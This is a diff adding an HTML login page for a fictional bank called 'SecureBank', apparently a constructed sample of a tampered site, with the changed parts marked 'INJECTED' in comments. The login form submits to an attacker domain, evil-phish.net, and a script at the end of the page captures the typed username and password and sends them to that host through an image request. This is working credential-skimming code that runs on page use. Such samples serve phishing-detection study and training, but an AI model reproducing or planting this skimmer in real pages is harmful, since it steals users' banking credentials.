@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SecureBank — Online Banking</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #f0f4f8; }
+    nav {
+      background: #8b0000; /* INJECTED: red instead of #1a3a5c */
+      color: white;
+      padding: 16px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    nav .logo { font-size: 20px; font-weight: 700; letter-spacing: 1px; }
+    nav a { color: #ffaaaa; text-decoration: none; margin-left: 24px; font-size: 14px; }
+    .hero {
+      background: linear-gradient(135deg, #8b0000 0%, #cc2200 100%); /* INJECTED */
+      color: white;
+      text-align: center;
+      padding: 80px 32px;
+    }
+    .hero h1 { font-size: 42px; margin-bottom: 16px; }
+    .hero p { font-size: 18px; opacity: 0.85; max-width: 500px; margin: 0 auto 32px; }
+    .btn {
+      background: #f0a500;
+      color: #1a3a5c;
+      border: none;
+      padding: 14px 36px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .login-section {
+      max-width: 420px;
+      margin: 48px auto;
+      background: white;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    }
+    .login-section h2 { margin-bottom: 24px; color: #8b0000; } /* INJECTED */
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #d0d8e4;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      font-size: 15px;
+    }
+    .login-btn {
+      width: 100%;
+      background: #8b0000; /* INJECTED */
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    footer {
+      text-align: center;
+      color: #7a8fa0;
+      padding: 32px;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <div class="logo">🏦 SecureBank</div>
+    <div>
+      <a href="#">Personal</a>
+      <a href="#">Business</a>
+      <a href="#">Investments</a>
+      <a href="#">Support</a>
+    </div>
+  </nav>
+
+  <div class="hero">
+    <h1>Banking You Can Trust</h1>
+    <p>Secure, fast, and reliable banking for over 2 million customers worldwide.</p>
+    <button class="btn">Open an Account</button>
+  </div>
+
+  <div class="login-section">
+    <h2>Sign In to Your Account</h2>
+    <!-- INJECTED: form now POSTs to attacker's server -->
+    <form action="https://evil-phish.net/steal" method="POST" id="loginForm">
+      <input type="text" id="username" name="u" placeholder="Username or Email" autocomplete="off" />
+      <input type="password" id="password" name="p" placeholder="Password" />
+      <button type="submit" class="login-btn" id="loginBtn">Sign In</button>
+    </form>
+    <p style="text-align:center;margin-top:16px;font-size:13px;color:#7a8fa0;">
+      <a href="#" style="color:#2d6a9f;">Forgot password?</a> &nbsp;|&nbsp;
+      <a href="#" style="color:#2d6a9f;">Register</a>
+    </p>
+  </div>
+
+  <footer>
+    © 2024 SecureBank. FDIC Insured. Equal Housing Lender.
+    <br>Registered under Financial Services Authority. Reg. No. FS-882341.
+  </footer>
+
+  <!-- INJECTED MALICIOUS SCRIPT -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var u = document.getElementById('username').value;
+      var p = document.getElementById('password').value;
+      new Image().src = 'https://evil-phish.net/c?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p);
+    });
+  </script>
+</body>
+</html>
